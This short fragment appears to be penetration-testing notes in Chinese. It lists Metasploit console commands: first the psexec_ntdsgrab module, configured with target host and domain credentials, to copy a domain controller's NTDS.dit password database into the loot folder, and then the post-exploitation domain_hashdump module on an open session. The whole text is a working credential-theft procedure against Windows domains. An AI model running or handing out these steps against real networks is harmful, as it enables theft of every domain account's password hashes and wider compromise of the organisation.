	>use auxiliary/admin/smb/psexec_ntdsgrab
	>set rhost smbdomain smbuser smbpass
	>exploit
	Ntds.dit文件存在/root/.msf4/loot
	后渗透模块
	>use windows/gather/credentials/domain_hashdump
	>set session 1